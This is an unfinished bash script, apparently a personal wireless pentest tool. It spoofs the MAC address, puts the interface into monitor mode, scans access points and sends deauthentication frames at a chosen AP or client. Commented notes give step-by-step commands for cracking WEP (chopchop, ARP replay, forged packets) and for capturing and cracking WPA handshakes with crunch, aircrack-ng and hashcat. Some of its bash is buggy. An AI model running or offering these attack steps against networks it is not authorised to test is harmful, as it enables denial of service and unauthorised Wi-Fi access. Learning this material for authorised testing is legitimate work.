#!/bin/bash
##############################################################
#
#       00-wirelessAtk.sh - Wireless PenTest 
#
#           AUTHOR: Z1GSN1FF3R 
#
#           DATE: 01-27-2021
#   
#           DESCRIPTION: 
#
#
##############################################################



#Show the iw and the supported interfaces

    clear
    echo ""
    echo "=========== IW AVALIABLE ============="
    airmon-ng
    echo "=========== SUPPORTED INTERFACES ============="
    echo ""
    iw list | grep -iA8 "supported interface modes"
    echo ""
    echo "=============================================="
    echo ""

#Set the IW to Monitor mode and change the MAC address
    
    echo ""
    echo "=========== MONITOR MODE ============="
    echo ""
    read -p "IW to set on Monitor Mode: " IWX
    echo ""
    echo "======================================"
    echo ""

    ifconfig $IWX down
    macchanger -r $IWX
    ifconfig $IWX up
    iw dev $IWX interface add mon0 type monitor
    ifconfig mon0 up
    
    #start the iw in monitor mode
    
    #airmon-ng start mon0 (DISABLED)

    #kill the process that maybe cause some problem
    
    airmon-ng check kill
    
#start the scann & write a log for help   
    
    airodump-ng mon0 --write log-StartingScann
    
    #Show the results
    
    echo ""
    echo "------MACCHANGER-----"
    macchanger -s $IWX
    echo ""
    echo "------THE LOG-----"
    ls -1 log-StartingScann*
    echo ""
    
#Scanning the target AP    
    
    echo ""
    echo "============================================"
    echo ""
    read -p "Insert the BSSID to scann: " MACTARGET
    read -p "Insert the AP CHANNEL: " CHANNEL
    echo ""
    echo "============================================"
    echo ""

    airodump-ng mon0 --bssid $MACTARGET -c $CHANNEL --write log-ScannAP

    #Show the results
    
    echo ""
    echo "------THE LOG-----"
    ls -1 log-ScannAP*
    echo ""

#Deauth attack 
    
    echo ""
    echo "============================================"
    echo ""
    read -p "Insert the nr of DeauthAtk: " DEAUTHATK
    read -p "Insert the AP BSSID: " APBSSID
    read -p "Insert the Clnt MAC: " CLNTMAC
    echo ""
    echo "============================================"
    echo ""
    
    if [$CLNTMAC -eq ""] 
        then
            #Deauth Access Point
            aireplay-ng --deauth $DEAUTHATK -a $APBSSID mon0 | tee log-DeauthAP.txt               
            echo ""
            echo "------THE LOG-----"
            ls -1 log-DeauthAtk*
            echo ""
        else
            #Deauth Client
            aireplay-ng --deauth $DEAUTHATK -a $APBSSID -c $CLNTMAC mon0 | tee log-DeauthAtk.txt
            echo ""
            echo "------THE LOG-----"
            ls -1 log-DeauthAtk*
            echo ""
    fi
    

    echo ""
    
   #while :
    #do
        echo "Select the attack below: "
        echo " 1 - Deauth AP"
        echo " 2 - Deaut Client"
        echo " 3 - Fake Auth"
        echo " 4 - Chochop"
        echo " 5 - "
    
    
#Fake Auth Atk
    
    #aireplay-ng --fakeauth 0 -a (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon
    

#------------------------------------------------------   

#-----------------------------------------------------
    
#CRACKING

    #WEP
    
               
        
            #korek_chopchop_attack
        
                    #airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write sitrep-CHOPCHOP &&
                    #aireplay-ng --chopchop -a (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon &&
                    #packetforge-ng --arp -a (#MAC TARGET) -h (#YOUR FAKE MAC) -k 255.255.255.255 -l 255.255.255.255 -y (#replay_MMM-HHHH-YYYYDD.xor) -w sitrep-FORGED &&
                    #aireplay-ng -2 -r sitrep-FORGED wlan0mon &&
                    #aircrack-ng sitrep-CHOPCHOP-01.cap       
        
            #arp_request_replay_attack_(BEST_&_QUICKEST)
        
                    #airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write sitrep-ARRA &&
                    #aireplay-ng --fakeauth 0 -a (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon &&
                    #aireplay-ng --arpreplay -b (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon &&
                    #aircrack-ng sitrep-ARRA-01.cap
        
    #WPA/WPA2

        #capture_the_handshake

            #steps

                #a)save_all_the_captured_packets(airodump-ng)

                    #airodump-ng wlan0mon --write sitrep-SATCP && 
                    #airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write cap-HDSHK

                #b) disconnect_a_client(Deauth_atk)

                    #aireplay-ng --deauth 10 -a (#MAC TARGET) -c (#MAC CLIENT TARGET) wlan0mon --write sitrep-DEAUTH
                    #&& ls *.cap

                #c) abort_atk

        #generating_wordlist

            #crunch_-_popular_commands

                #crunch 8 8 1234567890 -o /home/blackwolf/crunch_ex.txt #exemplo
                
                #(MIN) the min num of char
                #(MAX) the max num of char
                #-T (PATTERN) can be used if u know the first of the last char of the passwd
                #-O (OUTPUT) the path of the output


        #cracking_the_key_using_Aircrack-ng(BASIC)

            #dictionary_atk

                #aircrack-ng -w /usr/share/wordlists/rockyou.txt *-01.cap

        #hashcat_(GPU)

            #convert_*.cap_in_*.hccapx
                    #firefox https://hashcat.net/cap2hccapx/ &

            #hashcat ????
